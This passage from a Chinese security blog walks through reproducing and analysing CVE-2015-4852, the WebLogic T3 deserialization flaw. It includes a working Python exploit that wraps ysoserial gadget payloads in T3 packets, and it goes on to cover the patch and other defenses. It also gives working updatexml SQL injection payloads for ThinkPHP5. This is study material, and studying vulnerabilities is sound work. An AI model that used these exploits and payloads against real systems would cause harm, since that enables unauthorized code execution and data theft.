title="请求包头"></a>请求包头</h3><p>请求包的头如下</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">t3</span> <span class="hljs-number">12</span>.<span class="hljs-number">2</span>.<span class="hljs-number">1</span> AS:<span class="hljs-number">255</span> HL:<span class="hljs-number">19</span> MS:<span class="hljs-number">10000000</span> PU:t<span class="hljs-number">3</span>://us-l-breens:<span class="hljs-number">7001</span><br></code></pre></td></tr></table></figure><p>发送一个请求包的头，看看会返回什么</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> socket<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">T3Test</span>(<span class="hljs-params">ip,port</span>):</span><br>    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>    sock.connect((ip, port))<br>    handshake = <span class="hljs-string">&quot;t3 12.2.3\nAS:255\nHL:19\nMS:10000000\n\n&quot;</span> <span class="hljs-comment">#请求包的头</span><br>    sock.sendall(handshake.encode())<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        data = sock.recv(<span class="hljs-number">1024</span>)<br>        print(data.decode())<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    ip = <span class="hljs-string">&quot;192.168.111.132&quot;</span><br>    port = <span class="hljs-number">7001</span><br><br>    T3Test(ip,port)<br></code></pre></td></tr></table></figure><p>返回内容中包含了版本信息</p><p><a href="https://imgtu.com/i/WcmW28"><img src="https://z3.ax1x.com/2021/07/24/WcmW28.png" alt="WcmW28.png"></a></p><p>用wireshark抓包</p><p><a href="https://imgtu.com/i/Wcm2PP"><img src="https://z3.ax1x.com/2021/07/24/Wcm2PP.png" alt="Wcm2PP.png"></a></p><p>然后追踪TCP流，可以看到在HELO后面会返回一个版本号</p><p><a href="https://imgtu.com/i/Wcm6UI"><img src="https://z3.ax1x.com/2021/07/24/Wcm6UI.png" alt="Wcm6UI.png"></a></p><h3 id="请求主体"><a href="#请求主体" class="headerlink" title="请求主体"></a>请求主体</h3><p>T3协议中传输的都是序列化数据，分为七个部分，第一部分就是协议头，也就是</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">t3</span> <span class="hljs-number">12</span>.<span class="hljs-number">2</span>.<span class="hljs-number">3</span>\nAS:<span class="hljs-number">255</span>\nHL:<span class="hljs-number">19</span>\nMS:<span class="hljs-number">10000000</span>\n\n<br></code></pre></td></tr></table></figure><p>借用两张图来描述一下T3协议包的主要内容</p><p><a href="https://imgtu.com/i/WcnkRK"><img src="https://z3.ax1x.com/2021/07/24/WcnkRK.png" alt="WcnkRK.png"></a><br><a href="https://imgtu.com/i/WcnYLQ"><img src="https://z3.ax1x.com/2021/07/24/WcnYLQ.jpg" alt="WcnYLQ.jpg"></a></p><p>第二到第七部分内容，开头都是<code>ac ed 00 05</code>，说明这些都是序列化的数据。只要把其中一部分替换成我们的序列化数据就可以了，有两种替换方式</p><ol><li>将weblogic发送的JAVA序列化数据的第二到九部分的JAVA序列化数据的任意一个替换为恶意的序列化数据。</li><li>将weblogic发送的JAVA序列化数据的第一部分与恶意的序列化数据进行拼接。</li></ol><h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><p>这里可以用jdk7u21和cc1两条链，用创建文件的方式来检验反序列化是否成功</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> os <span class="hljs-keyword">import</span> popen<br><span class="hljs-keyword">import</span> struct <span class="hljs-comment"># 负责大小端的转换</span><br><span class="hljs-keyword">import</span> subprocess<br><span class="hljs-keyword">from</span> sys <span class="hljs-keyword">import</span> stdout<br><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> binascii<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">generatePayload</span>(<span class="hljs-params">gadget,cmd</span>):</span><br>    YSO_PATH = <span class="hljs-string">&quot;ysoserial.jar&quot;</span><br>    popen = subprocess.Popen([<span class="hljs-string">&#x27;java&#x27;</span>,<span class="hljs-string">&#x27;-jar&#x27;</span>,YSO_PATH,gadget,cmd],stdout=subprocess.PIPE)<br>    <span class="hljs-keyword">return</span> popen.stdout.read()<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">T3Exploit</span>(<span class="hljs-params">ip,port,payload</span>):</span><br>    sock =socket.socket(socket.AF_INET,socket.SOCK_STREAM)<br>    sock.connect((ip,port))<br>    handshake = <span class="hljs-string">&quot;t3 12.2.3\nAS:255\nHL:19\nMS:10000000\n\n&quot;</span><br>    sock.sendall(handshake.encode())<br>    data = sock.recv(<span class="hljs-number">1024</span>)<br>    <span class="hljs-built_in">compile</span> = re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">&quot;HELO:(.*).0.false&quot;</span>)<br>    match = <span class="hljs-built_in">compile</span>.findall(data.decode())<br>    <span class="hljs-keyword">if</span> match:<br>        print(<span class="hljs-string">&quot;Weblogic: &quot;</span>+<span class="hljs-string">&quot;&quot;</span>.join(match))<br>    <span class="hljs-keyword">else</span>:<br>        print(<span class="hljs-string">&quot;Not Weblogic&quot;</span>)<br>        <span class="hljs-comment">#return</span><br>    header = binascii.a2b_hex(<span class="hljs-string">b&quot;00000000&quot;</span>)<br>    t3header = binascii.a2b_hex(<span class="hljs-string">b&quot;016501ffffffffffffffff000000690000ea60000000184e1cac5d00dbae7b5fb5f04d7a1678d3b7d14d11bf136d67027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006&quot;</span>)<br>    desflag = binascii.a2b_hex(<span class="hljs-string">b&quot;fe010000&quot;</span>)<br>    payload = header + t3header  +desflag+  payload<br>    payload = struct.pack(<span class="hljs-string">&quot;&gt;I&quot;</span>,<span class="hljs-built_in">len</span>(payload)) + payload[<span class="hljs-number">4</span>:]<br>    sock.send(payload)<br>    <br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    ip = <span class="hljs-string">&quot;192.168.111.132&quot;</span><br>    port = <span class="hljs-number">7001</span><br>    gadget = <span class="hljs-string">&quot;CommonsCollections1&quot;</span><br>    cmd = <span class="hljs-string">&quot;touch /tmp/success&quot;</span><br>    payload = generatePayload(gadget,cmd)<br>    T3Exploit(ip,port,payload)<br></code></pre></td></tr></table></figure><p>查看一下容器里的/tmp目录，发现成功创建了success文件</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">docker</span> exec  weblogic<span class="hljs-number">1036</span>jdk<span class="hljs-number">7</span>u<span class="hljs-number">21</span> ls tmp/<br></code></pre></td></tr></table></figure><p><a href="https://imgtu.com/i/Wcmc5t"><img src="https://z3.ax1x.com/2021/07/24/Wcmc5t.png" alt="Wcmc5t.png"></a></p><h2 id="payload数据包分析"><a href="#payload数据包分析" class="headerlink" title="payload数据包分析"></a>payload数据包分析</h2><p>wireshark添加过滤器</p><figure class="highlight elm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elm"><span class="hljs-title">tcp</span>.<span class="hljs-keyword">port</span> == 7001<br></code></pre></td></tr></table></figure><p><a href="https://imgtu.com/i/WcmfxS"><img src="https://z3.ax1x.com/2021/07/24/WcmfxS.png" alt="WcmfxS.png"></a></p><p>第一个数据包是我们发送的请求头，第二个数据包是weblogic回复HELO和版本，第三个才是payload数据包</p><p><a href="https://imgtu.com/i/Wcm4Kg"><img src="https://z3.ax1x.com/2021/07/24/Wcm4Kg.png" alt="Wcm4Kg.png"></a></p><p>来详细看一下第三个数据包，主要有四个组成部分，如下</p><ol><li>数据包长度</li><li>T3协议头</li><li>反序列化标志：T3协议中每个反序列化数据包前面都带有<code>fe 01 00 00</code>，再加上反序列化标志<code>ac ed 00 05</code>就变成了<code>fe 01 00 00 ac ed 00 05</code></li><li>数据</li></ol><p><a href="https://imgtu.com/i/Wcm5rQ"><img src="https://z3.ax1x.com/2021/07/24/Wcm5rQ.png" alt="Wcm5rQ.png"></a></p><p>再回来看看poc，这个poc本质就是把ysoserial生成的payload变成t3协议里的数据格式。</p><ul><li>数据包长度包括了自身长度和其他三部分数据包长度，所以需要先占位，计算出长度后再替换进去</li><li>T3协议头是固定的，直接硬编码进去就行</li><li>反序列化标志+数据=weblogic反序列化标志<code>fe010000</code>+ysoserial生成的序列化数据</li></ul><p><a href="https://imgtu.com/i/WcmIbj"><img src="https://z3.ax1x.com/2021/07/24/WcmIbj.png" alt="WcmIbj.png"></a></p><h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><h2 id="CVE-2015-4852"><a href="#CVE-2015-4852" class="headerlink" title="CVE-2015-4852"></a>CVE-2015-4852</h2><p>1.<code>weblogic.rjvm.InboundMsgAbbrev#readObject</code></p><p>调用了内部类InboundMsgAbbrev.ServerChannelInputStream的readObject方法</p><p><a href="https://imgtu.com/i/Wcmrbd"><img src="https://z3.ax1x.com/2021/07/24/Wcmrbd.png" alt="Wcmrbd.png"></a></p><p>2.<code>InboundMsgAbbrev.ServerChannelInputStream#readObject</code></p><p>ServerChannelInputStream继承自ObjectInputStream类，这里重写了resolveClass，但是实际上调用的还是父类ObjectInputStream的resolveClass方法，等于没有做任何防御，导致漏洞的出现。</p><p><a href="https://imgtu.com/i/WcmTVs"><img src="https://z3.ax1x.com/2021/07/24/WcmTVs.png" alt="WcmTVs.png"></a></p><p>可以在导入的依赖中看到这个版本自带CommonCollections3.2.0，这样反序列化点和gadget就都有了。利用ysoserial生成CommonsCollections1的payload然后放到T3协议数据包力就可以了</p><p><a href="https://imgtu.com/i/Wcm7an"><img src="https://z3.ax1x.com/2021/07/24/Wcm7an.png" alt="Wcm7an.png"></a></p><p>那么现在有一个问题，为什么说resolveClass可以防御Java反序列化？</p><h2 id="resolveClass作用"><a href="#resolveClass作用" class="headerlink" title="resolveClass作用"></a>resolveClass作用</h2><p>先从resolveClass的作用说起。</p><p><code>resolveClass</code>方法的作用是将类的序列化描述符加工成该类的Class对象。</p><p><a href="https://imgtu.com/i/WcmvMF"><img src="https://z3.ax1x.com/2021/07/24/WcmvMF.png" alt="WcmvMF.png"></a></p><p>因为对应的Class对象是在resolveClass这里返回的，所以这里是防御反序列化的关键。重写resolveClass然后再里面添加一个类的黑名单，发现类在黑名单中就抛出错误，这样就无法获取恶意的类的Class对象。此方法一定程度上可以防御反序列化（虽然黑名单过滤效果不好）</p><p><a href="https://imgtu.com/i/WcmO2T"><img src="https://z3.ax1x.com/2021/07/24/WcmO2T.png" alt="WcmO2T.png"></a></p><p>weblogic进行反序列化的执行流程图</p><p><a href="https://imgtu.com/i/WcmyVA"><img src="https://z3.ax1x.com/2021/07/24/WcmyVA.png" alt="WcmyVA.png"></a></p><p>借用的反序列化攻击时序图</p><p><a href="https://imgtu.com/i/Wcmxr4"><img src="https://z3.ax1x.com/2021/07/24/Wcmxr4.png" alt="Wcmxr4.png"></a></p><h2 id="CVE-2015-4852修复"><a href="#CVE-2015-4852修复" class="headerlink" title="CVE-2015-4852修复"></a>CVE-2015-4852修复</h2><p>参考这篇文章中的补丁：<a href="http://redteam.today/2020/03/25/weblogic%E5%8E%86%E5%8F%B2T3%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%8F%8A%E8%A1%A5%E4%B8%81%E6%A2%B3%E7%90%86/">http://redteam.today/2020/03/25/weblogic%E5%8E%86%E5%8F%B2T3%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%8F%8A%E8%A1%A5%E4%B8%81%E6%A2%B3%E7%90%86/</a></p><p>Weblogic对CVE-2015-4852的修复措施是在resloveClass里加上 ClassFilter.isBlackListed黑名单过滤</p><p><a href="https://imgtu.com/i/WcmqP0"><img src="https://z3.ax1x.com/2021/07/24/WcmqP0.png" alt="WcmqP0.png"></a></p><p>黑名单的内容，可以看到黑名单过滤了CommonCollections</p><p><a href="https://imgtu.com/i/WcmzqJ"><img src="https://z3.ax1x.com/2021/07/24/WcmzqJ.png" alt="WcmzqJ.png"></a></p><p>还参考这篇文章中的修复方式：<a href="https://www.anquanke.com/post/id/226070#h2-15">https://www.anquanke.com/post/id/226070#h2-15</a></p><p>不局限于重写resolveClass</p><p>开放在外网的情况下，还可以采用web代理和负载均衡。</p><ol><li>web代理的方式只能转发HTTP的请求，而不会转发T3协议的请求，这就能防御住T3漏洞的攻击。</li><li>负载均衡的情况下，可以指定需要进行负载均衡的协议类型，这么这里就可以设置为HTTP的请求，不接收其他的协议请求转发。这也是在外网中见到T3协议漏洞比较少的原因之一。</li></ol><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>主要学习了以下内容</p><ol><li>T3协议的组成和在Weblogic反序列化中的利用</li><li>CVE-2015-4852的产生原因及修复，以及resolveClass在防御反序列化方面的应用</li></ol><p>对于Weblogic解析T3协议的具体过程还有待分析</p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://mp.weixin.qq.com/s?__biz=MzU5NDgxODU1MQ==&amp;mid=2247485058&amp;idx=1&amp;sn=d22b310acf703a32d938a7087c8e8704">https://mp.weixin.qq.com/s?__biz=MzU5NDgxODU1MQ==&amp;mid=2247485058&amp;idx=1&amp;sn=d22b310acf703a32d938a7087c8e8704</a></p><p><a href="http://wjlshare.com/archives/1573">http://wjlshare.com/archives/1573</a></p><p><a href="http://redteam.today/2020/03/25/weblogic%E5%8E%86%E5%8F%B2T3%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%8F%8A%E8%A1%A5%E4%B8%81%E6%A2%B3%E7%90%86/">http://redteam.today/2020/03/25/weblogic%E5%8E%86%E5%8F%B2T3%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%8F%8A%E8%A1%A5%E4%B8%81%E6%A2%B3%E7%90%86/</a></p><p><a href="https://www.anquanke.com/post/id/226070#h3-13">https://www.anquanke.com/post/id/226070#h3-13</a></p><p><a href="http://redteam.today/2020/02/14/Java%E5%8E%9F%E7%94%9F%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%BB%A3%E7%A0%81%E7%AE%80%E8%A6%81%E5%88%86%E6%9E%90/">http://redteam.today/2020/02/14/Java%E5%8E%9F%E7%94%9F%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%BB%A3%E7%A0%81%E7%AE%80%E8%A6%81%E5%88%86%E6%9E%90/</a></p><p><a href="https://github.com/Cryin/Paper/blob/master/%E6%B5%85%E8%B0%88Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%A1%88.md">https://github.com/Cryin/Paper/blob/master/%E6%B5%85%E8%B0%88Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%A1%88.md</a></p><p><a href="https://www.cnblogs.com/0x7e/p/14529949.html">https://www.cnblogs.com/0x7e/p/14529949.html</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>thinkphp5框架SQL注入分析：聚合函数</title>
    <link href="/2021/07/23/thinkphp5%E6%A1%86%E6%9E%B6SQL%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90%EF%BC%9A%E8%81%9A%E5%90%88%E5%87%BD%E6%95%B0/"/>
    <url>/2021/07/23/thinkphp5%E6%A1%86%E6%9E%B6SQL%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90%EF%BC%9A%E8%81%9A%E5%90%88%E5%87%BD%E6%95%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>漏洞存在于所有Mysql聚合函数相关方法，如 <strong>AVG ， COUNT ， SUM</strong> ， MIN ， MAX 等</p><p>漏洞影响版本： <strong>5.0.0&lt;=ThinkPHP&lt;=5.0.21</strong> 、 <strong>5.1.3&lt;=ThinkPHP5&lt;=5.1.25</strong> 。</p><p>不同版本的payload</p><ul><li><p><strong>5.0.0~5.0.21</strong> 、 <strong>5.1.3～5.1.10</strong> ： </p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">id</span>)%<span class="hljs-number">2</span>bupdatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x<span class="hljs-number">7</span>e,database()),<span class="hljs-number">0</span>) from users%<span class="hljs-number">23</span><br></code></pre></td></tr></table></figure></li></ul><ul><li><p><strong>5.1.11～5.1.25</strong> ： </p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">id</span>`)%<span class="hljs-number">2</span>bupdatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x<span class="hljs-number">7</span>e,database()),<span class="hljs-number">0</span>) from users%<span class="hljs-number">23</span><br></code></pre></td></tr></table></figure></li></ul><h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><h2 id="5-0-10"><a href="#5-0-10" class="headerlink" title="5.0.10"></a>5.0.10</h2><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://localhost/tp<span class="hljs-number">501</span>/public/?options=id)%<span class="hljs-number">2</span>bupdatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x<span class="hljs-number">7</span>e,database()),<span class="hljs-number">0</span>)%<span class="hljs-number">20</span>from%<span class="hljs-number">20</span>users%<span class="hljs-number">23</span><br></code></pre></td></tr></table></figure><p><a href="https://imgtu.com/i/WrGkIs"><img src="https://z3.ax1x.com/2021/07/23/WrGkIs.png" alt="WrGkIs.png"></a></p><h2 id="5-1-22"><a href="#5-1-22" class="headerlink" title="5.1.22"></a>5.1.22</h2><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://localhost/tp<span class="hljs-number">5122</span>/public/?options=id`)%<span class="hljs-number">2</span>bupdatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x<span class="hljs-number">7</span>e,database()),<span class="hljs-number">0</span>)%<span class="hljs-number">20</span>from%<span class="hljs-number">20</span>users%<span class="hljs-number">23</span><br></code></pre></td></tr></table></figure><p><a href="https://imgtu.com/i/WrGFaj"><img src="https://z3.ax1x.com/2021/07/23/WrGFaj.png" alt="WrGFaj.png"></a></p><h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><h2 id="5-1-22版本"><a href="#5-1-22版本" class="headerlink" title="5.1.22版本"></a>5.1.22版本</h2><p>1.控制器中，传入的参数$options进入了max</p><p><a href="https://imgtu.com/i/Wr8jPI"><img src="https://z3.ax1x.com/2021/07/23/Wr8jPI.png" alt="Wr8jPI.png"></a></p><p>2.进入max，调用aggregate</p><p><a href="https://imgtu.com/i/Wr8vGt"><img src="https://z3.ax1x.com/2021/07/23/Wr8vGt.png" alt="Wr8vGt.png"></a></p><p>3.aggregate中调用think\db\Connection类的aggregate</p><p><a href="https://imgtu.com/i/Wr8xRP"><img src="https://z3.ax1x.com/2021/07/23/Wr8xRP.png" alt="Wr8xRP.png"></a></p><p>4.think\db\Connection类的aggregate中经过两步</p><ol><li>先拼接聚合函数名，然后在parseKey拼接反引号</li><li>拼接好的$field传入value执行</li></ol><p><a href="https://imgtu.com/i/WrGpM8"><img src="https://z3.ax1x.com/2021/07/23/WrGpM8.png" alt="WrGpM8.png"></a></p><p>5.value</p><p>之前已经分析过几次thinkphp的注入了，这里跟之前的基本一样，主要执行了四步</p><ol><li>把$field拆分成数组</li><li>setOption把$field赋值给<code>$this-&gt;options[&#39;field&#39;]</code></li><li>select拼接sql语句</li><li>query执行sql语句</li></ol><p><a href="https://imgtu.com/i/WrG9sS"><img src="https://z3.ax1x.com/2021/07/23/WrG9sS.png" alt="WrG9sS.png"></a></p><p>6.select</p><p>又是这个熟悉的模板，这次需要关注的是parseField</p><p><a href="https://imgtu.com/i/Wr8zxf"><img src="https://z3.ax1x.com/2021/07/23/Wr8zxf.png" alt="Wr8zxf.png"></a></p><p>7.parseField</p><p>传入的参数$this-&gt;options[‘field’]</p><p><a href="https://imgtu.com/i/Wr8OIA"><img src="https://z3.ax1x.com/2021/07/23/Wr8OIA.png" alt="Wr8OIA.png"></a></p><p>这里实际上只执行了两步</p><ol><li>parseKey中由于两个if条件都不满足，直接原封不动的返回$key</li><li>implode把之前拆分的$fields数组重新拼接回去，又变回原来的语句了</li></ol><p><a href="https://imgtu.com/i/WrGCqg"><img src="https://z3.ax1x.com/2021/07/23/WrGCqg.png" alt="WrGCqg.png"></a></p><p>8.最后进入query执行，实际执行的sql语句</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">SELECT</span> <span class="hljs-built_in">MAX</span>(<span class="hljs-symbol">`id`</span>)+updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,<span class="hljs-keyword">database</span>()),<span class="hljs-number">0</span>)<br></code></pre></td></tr></table></figure><p><a href="https://imgtu.com/i/WrGiZQ"><img src="https://z3.ax1x.com/2021/07/23/WrGiZQ.png" alt="WrGiZQ.png"></a></p><h2 id="5-0-10版本"><a href="#5-0-10版本" class="headerlink" title="5.0.10版本"></a>5.0.10版本</h2><p>对比下两种payload，发现唯一的区别是多了一个反引号</p><p>5.0.10</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">id</span>)%<span class="hljs-number">2</span>bupdatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x<span class="hljs-number">7</span>e,database()),<span class="hljs-number">0</span>) from users%<span class="hljs-number">23</span><br></code></pre></td></tr></table></figure><p>5.1.22</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">id</span>`)%<span class="hljs-number">2</span>bupdatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x<span class="hljs-number">7</span>e,database()),<span class="hljs-number">0</span>) from users%<span class="hljs-number">23</span><br></code></pre></td></tr></table></figure><p>看到5.0.10版本的max函数，发现少了拼接反引号的操作</p><p><a href="https://imgtu.com/i/WrGEin"><img src="https://z3.ax1x.com/2021/07/23/WrGEin.png" alt="WrGEin.png"></a></p><p>可以看到传入value的$field没有拼接反引号</p><p><a href="https://imgtu.com/i/WrGVGq"><img src="https://z3.ax1x.com/2021/07/23/WrGVGq.png" alt="WrGVGq.png"></a></p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://github.com/Mochazz/ThinkPHP-Vuln">https://github.com/Mochazz/ThinkPHP-Vuln</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>thinkphp5框架SQL注入分析：parseOrderby</title>
    <link href="/2021/07/22/thinkphp5%E6%A1%86%E6%9E%B6SQL%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90%EF%BC%9AparseOrderby/"/>
    <url>/2021/07/22/thinkphp5%E6%A1%86%E6%9E%B6SQL%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90%EF%BC%9AparseOrderby/</url>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>漏洞存在于Builder类的parseOrderby方法中，order by注入</p><p>漏洞影响版本： <strong>5.1.16&lt;=ThinkPHP5&lt;=5.1.22</strong> 。</p><p>测试的时候用php7一直报错，换成php5才行</p><h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>下载源码</p><figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dsconfig"><span class="hljs-string">composer </span><span class="hljs-built_in">create-project</span> <span class="hljs-built_in">--prefer-dist</span> <span class="hljs-string">topthink/</span><span class="hljs-string">think=</span>5.1.<span class="hljs-string">22 </span><span class="hljs-string">tp5122</span><br></code></pre></td></tr></table></figure><p>修改composer.json，执行composer update</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs 1c"><span class="hljs-string">&quot;require&quot;</span>: &#123;<br>       <span class="hljs-string">&quot;php&quot;</span>: <span class="hljs-string">&quot;&gt;=5.6.0&quot;</span>,<br>       <span class="hljs-string">&quot;topthink/framework&quot;</span>: <span class="hljs-string">&quot;5.1.22&quot;</span><br>   &#125;<br></code></pre></td></tr></table></figure><p>添加控制器</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">namespace</span> <span class="hljs-title">app</span>\<span class="hljs-title">index</span>\<span class="hljs-title">controller</span>;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Index</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">index</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$orderby</span> = request()-&gt;get(<span class="hljs-string">&#x27;orderby&#x27;</span>);<br>        <span class="hljs-variable">$result</span> = db(<span class="hljs-string">&#x27;users&#x27;</span>)-&gt;where([<span class="hljs-string">&#x27;username&#x27;</span> =&gt; <span class="hljs-string">&#x27;test&#x27;</span>])-&gt;order(<span class="hljs-variable">$orderby</span>)-&gt;find();<br>        var_dump(<span class="hljs-variable">$result</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-link">http://localhost/tp5122/public/?orderby</span>[<span class="hljs-string">id`||updatexml(1,concat(0x7e,user()),0)%23</span>]=1<br></code></pre></td></tr></table></figure><p><a href="https://imgtu.com/i/W0veIK"><img src="https://z3.ax1x.com/2021/07/22/W0veIK.png" alt="W0veIK.png"></a></p><h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>1.输入的payload在控制器中被传递给order方法</p><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xquery">?orderby<span class="hljs-built_in">[id</span>`||updatexml(<span class="hljs-number">1</span><span class="hljs-built_in">,concat</span>(<span class="hljs-number">0x7e</span>,user()),<span class="hljs-number">0</span>)<span class="hljs-meta">%23</span>]=<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p><a href="https://imgtu.com/i/W0vVVx"><img src="https://z3.ax1x.com/2021/07/22/W0vVVx.png" 